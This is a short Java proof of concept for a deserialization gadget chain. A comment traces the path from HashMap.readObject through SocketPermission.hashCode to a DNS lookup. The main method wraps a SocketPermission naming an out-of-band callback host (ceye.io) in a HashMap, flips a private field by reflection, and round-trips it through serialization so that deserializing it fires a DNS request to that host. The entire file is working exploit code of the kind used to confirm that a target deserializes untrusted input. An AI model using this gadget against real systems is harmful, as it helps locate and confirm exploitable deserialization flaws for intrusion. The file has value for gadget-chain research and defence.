package com.example.JDK;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.net.SocketPermission;
import java.util.HashMap;

public class POC_1 {

    /***
     * <java.util.HashMap: void readObject(java.io.ObjectInputStream)>
     * <java.util.HashMap: int hash(java.lang.Object)>
     * <java.net.SocketPermission: int hashCode()>
     * <java.net.SocketPermission: void getCanonName()>
     * <java.net.SocketPermission: void getIP()>
     * <java.net.InetAddress: java.net.InetAddress[] getAllByName0(java.lang.String,boolean)>
     * <java.net.InetAddress: java.net.InetAddress[] getAllByName0(java.lang.String,java.net.InetAddress,boolean)>
     */

    public static void main(String[] args) throws Exception {
        HashMap<SocketPermission,Integer> map = new HashMap<>();
        SocketPermission permission = new SocketPermission("k2nlbt.ceye.io", "connect");
        ReflectionUtil.setField(permission, "init_with_ip", true);
        map.put(permission, 1);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }
}
